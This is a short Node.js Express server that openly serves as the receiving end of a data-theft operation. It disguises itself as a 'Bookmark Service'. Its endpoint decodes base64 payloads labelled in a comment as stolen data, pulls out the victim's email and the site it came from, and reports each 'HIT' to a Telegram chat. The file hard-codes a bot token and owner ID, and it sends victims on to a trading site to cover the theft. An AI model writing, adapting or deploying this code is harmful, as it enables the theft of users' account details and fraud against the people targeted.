const express = require('express');
const app = express();

const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const OWNER_ID = '7680513699';

let hitCount = 0;

// Send message to Telegram
async function notify(chatId, message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    console.log('Notification sent:', response.ok);
  } catch (e) {
    console.error('Notify failed:', e.message);
  }
}

// Main endpoint - processes stolen data
app.get('/data/:b64', async (req, res) => {
  try {
    hitCount++;
    
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    const email = data.user?.email || 'Unknown';
    const site = data.site || 'Unknown';
    
    const message = `🎯 HIT #${hitCount}\n\nEmail: ${email}\nSite: ${site}\nTime: ${new Date().toLocaleString()}`;
    
    await notify(OWNER_ID, message);
    
    console.log(`Hit #${hitCount}: ${email}`);
    
    res.redirect('https://axiom.trade/discover');
  } catch (e) {
    console.error('Error:', e.message);
    res.status(500).send('Error');
  }
});

// Home page
app.get('/', (req, res) => {
  res.send(`
    <h1>Bookmark Service</h1>
    <p>Status: Online ✅</p>
    <p>Total Hits: ${hitCount}</p>
    <p>Server: https://nodebookmark.onrender.com</p>
  `);
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running on https://nodebookmark.onrender.com');
});
